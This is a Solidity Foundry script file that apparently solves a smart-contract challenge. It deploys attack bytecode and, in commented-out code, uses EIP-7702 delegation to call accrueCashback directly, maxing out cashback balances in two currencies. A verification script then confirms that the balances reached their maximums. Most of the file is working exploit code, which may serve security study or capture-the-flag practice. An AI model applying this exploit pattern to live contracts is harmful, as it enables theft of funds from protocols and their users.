// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Script, console} from "forge-std/Script.sol";
import {
    ICashbackAttack,
    BASIS_POINTS,
    CASHBACK_ADDR,
    NATIVE_MAX_CASHBACK,
    NATIVE_CASHBACK_RATE,
    FREEDOM_ADDR,
    FREEDOM_MAX_CASHBACK,
    FREEDOM_CASHBACK_RATE,
    ATTACK_CREATION_BYTECODE
} from "./CashbackAttack.sol";
import {Currency, CurrencyLibrary, Cashback} from "./Cashback.sol";

contract DeployAttackCode is Script {
    function run() public {
        uint256 sk = vm.envUint("PRIVATE_KEY");

        address payable player = payable(vm.addr(sk));
        uint256 bal = player.balance;
        console.log("player: %s, bal: %s", player, bal);

        vm.startBroadcast(sk);

        address addr;
        bytes memory creation = ATTACK_CREATION_BYTECODE;
        assembly {
            addr := create(0, add(creation, 0x20), mload(creation))
        }
        require(addr != address(0), "CREATE failed");

        vm.stopBroadcast();
    }
}

// contract AttackScript is Script {
//     // storage
//     // CashbackAttack cc = CashbackAttack(CASHBACK_COLLISION_ADDR);
//     Cashback cashback = Cashback(CASHBACK_ADDR);
//     Currency freedomCurrency = Currency.wrap(FREEDOM_ADDR);

//     function run() public {
//         uint256 sk = vm.envUint("PRIVATE_KEY");

//         address payable player = payable(vm.addr(sk));
//         uint256 bal = player.balance;
//         console.log("player: %s, bal: %s", player, bal);

//         vm.startBroadcast(sk);

//         // --- Using CashbackAttack as delegate smart contract ---
//         CashbackAttack cc = new CashbackAttack();

//         vm.signAndAttachDelegation(address(cc), sk);
//         CashbackAttack(player).setNonce(0);

//         // --- Using Cashback as delegate smart contract ---
//         // vm.signAndAttachDelegation(address(CASHBACK_ADDR), sk);

//         // attack 1 - calling accrueCashback() directly
//         uint256 nativeAmt = NATIVE_MAX_CASHBACK * BASIS_POINTS / NATIVE_CASHBACK_RATE;
//         cashback.accrueCashback(CurrencyLibrary.NATIVE_CURRENCY, nativeAmt);

//         // attack 2 - calling accrueCashback() directly
//         uint256 freedomAmt = FREEDOM_MAX_CASHBACK * BASIS_POINTS / FREEDOM_CASHBACK_RATE;
//         cashback.accrueCashback(freedomCurrency, freedomAmt);

//         // // --- Revert back to regular EOA contract ---
//         // vm.signAndAttachDelegation(address(0), sk);
//         // (bool ok,) = player.call("");
//         // require(ok, "Fail to revert back to be a regular EOA");

//         vm.stopBroadcast();
//     }
// }

// /**
//  * function accrueCashback(Currency currency, uint256 amount)
//  *         external
//  *         onlyDelegatedToCashback
//  *         onlyUnlocked
//  *         onlyOnCashback
//  *     {
//  *
//  */
// contract VerifyScript is Script {
//     error UnequalCashback(address, uint256, uint256);

//     address player = 0xB0fD5a878DBF3F9358A251caF9b6Fc692A999cA7;
//     CashbackAttack cc = CashbackAttack(CASHBACK_COLLISION_ADDR);
//     Cashback cashback = Cashback(CASHBACK_ADDR);
//     Currency freedomCurrency = Currency.wrap(FREEDOM_ADDR);

//     function run() public view {
//         // Check the cashback is maxed out
//         Currency[] memory currencies = new Currency[](2);
//         currencies[0] = CurrencyLibrary.NATIVE_CURRENCY;
//         currencies[1] = freedomCurrency;
//         uint256 len = currencies.length;
//         for (uint256 i = 0; i < len; i++) {
//             uint256 maxCashback = cashback.maxCashback(currencies[i]);
//             uint256 userCashback = cashback.balanceOf(player, currencies[i].toId());
//             console.log(
//                 "addr: %s, maxCashback: %s, userCashback: %s", Currency.unwrap(currencies[i]), maxCashback, userCashback
//             );
//             require(
//                 maxCashback == userCashback, UnequalCashback(Currency.unwrap(currencies[i]), maxCashback, userCashback)
//             );
//         }
//     }
// }
